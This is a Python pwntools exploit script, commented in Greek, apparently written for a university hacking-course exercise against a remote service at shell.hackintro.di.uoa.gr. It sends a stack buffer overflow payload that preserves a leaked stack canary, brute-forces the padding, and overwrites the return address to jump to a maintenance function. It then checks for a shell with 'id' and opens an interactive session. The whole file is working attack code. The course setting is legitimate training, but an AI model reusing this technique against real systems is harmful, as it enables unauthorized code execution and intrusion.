from pwn import *
import time

# Στοιχεία Σύνδεσης
HOST = 'shell.hackintro.di.uoa.gr'
PORT = 28285

# Δεδομένα που βρήκες
CANARY_VAL = b"\x00\x78\x5b\x1b\x1c\x40\x19\x00" 
MAINTENANCE_ADDR = b"\x26\x92\x04\x08"
PREFIX_LEN = 6 # "Twit: "
LOCAL_SIZE = 128

def attack():
    # Δοκιμάζουμε padding από 0 έως 60 bytes μετά τον canary
    # Συνήθως στα 32-bit συστήματα είναι 4, 8 ή 12 bytes
    for padding in range(0, 64, 4):
        print(f"[*] Δοκιμή με Padding: {padding} bytes...")
        
        try:
            # Σύνδεση
            r = remote(HOST, PORT, timeout=1)
            
            # Κατασκευή του Payload
            # 1. Γεμίζουμε τη local (128 bytes) αφαιρώντας το prefix
            buf = b"A" * (LOCAL_SIZE - PREFIX_LEN)
            # 2. Τοποθετούμε τον Canary ακριβώς στη θέση του
            payload = buf + CANARY_VAL 
            # 3. Προσθέτουμε το padding μέχρι το EIP (Return Address)
            payload += b"B" * padding 
            # 4. Βάζουμε τη διεύθυνση που θέλουμε να τρέξει
            payload += MAINTENANCE_ADDR
            
            # Αποστολή (χωρίς sendline για να μην προσθέσουμε extra \n αν δεν χρειάζεται)
            r.send(payload)
            
            # Αναμονή για το alarm(2) του server
            time.sleep(2.5)
            
            # Έλεγχος αν πήραμε shell στέλνοντας μια απλή εντολή
            r.sendline(b"id")
            
            # Λήψη των δεδομένων
            # Χρησιμοποιούμε recv(timeout) για να μην κολλήσει αν δεν απαντήσει
            res = r.recv(timeout=1).decode(errors='ignore')
            
            if "MAINTENANCE" in res or "uid=" in res:
                print(f"\n[!!!] SHELL ΑΝΟΙΧΤΟ!")
                print(f"[+] Σωστό Padding: {padding}")
                r.interactive()
                return

            r.close()
            
        except EOFError:
            # Σημαίνει ότι το πρόγραμμα κράσαρε (μάλλον λάθος canary ή padding)
            continue

if __name__ == "__main__":
    attack()